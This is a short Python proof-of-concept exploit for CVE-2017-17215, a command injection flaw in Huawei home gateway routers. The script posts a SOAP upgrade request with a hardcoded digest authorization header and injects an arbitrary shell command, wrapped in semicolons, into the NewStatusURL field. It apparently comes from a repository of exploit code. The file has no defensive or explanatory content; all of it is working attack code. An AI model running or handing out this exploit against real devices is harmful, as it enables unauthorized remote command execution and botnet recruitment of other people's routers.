src/cve-2017-17215/poc.py

import requests
import argparse

parser = argparse.ArgumentParser(description="CVE-2017-17215 attack, please input the target address")
parser.add_argument('-d', '--destination', default='192.168.10.2')
parser.add_argument('-p', '--port', default='37215')
parser.add_argument('-c', '--cmd', default='mkdir /saghdsjsadasjhdashj')

args = parser.parse_args()

DST = args.destination
PORT = args.port
URL = 'http://{}:{}/ctrlt/DeviceUpgrade_1'.format(DST, PORT)
CMD = args.cmd

headers = {
    "Authorization": "Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669"
}

data = '''<?xml version="1.0" ?>
 <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">
   <NewStatusURL>;{};</NewStatusURL>
   <NewDownloadURL>HUAWEIUPNP</NewDownloadURL>
  </u:Upgrade>
 </s:Body>
</s:Envelope>
'''.format(CMD)
ret = requests.post(URL,headers=headers,data=data)
print(ret)
